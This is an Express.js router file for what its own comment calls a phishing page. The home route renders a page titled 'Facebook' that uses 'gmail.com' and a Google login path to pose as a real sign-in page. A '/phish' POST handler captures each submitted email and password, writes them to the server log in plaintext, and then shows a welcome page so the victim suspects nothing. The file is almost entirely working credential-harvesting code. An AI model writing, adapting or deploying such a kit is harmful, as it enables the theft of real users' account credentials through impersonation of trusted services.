var express = require('express');
var router = express.Router();

// /* GET home page. */
// router.get('/', function(req, res, next) {
//   res.render('index', { title: "Express", 'domain-name': 'Express', 'domain-path': 'ok' });
// });
/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: "Facebook", 'domain-name': 'gmail.com/', 'domain-path': '/auth/google/login' });
});
// post to phishing page 
router.post('/phish', function(req,res, next) {

  var user = req.body.email;
  var password = req.body.password;
  console.log(`User name = ${user}, password is ${password}`);
  var res_body = {
    user: user
  }
  
  res.render('welcome', res_body );

});

module.exports = router;
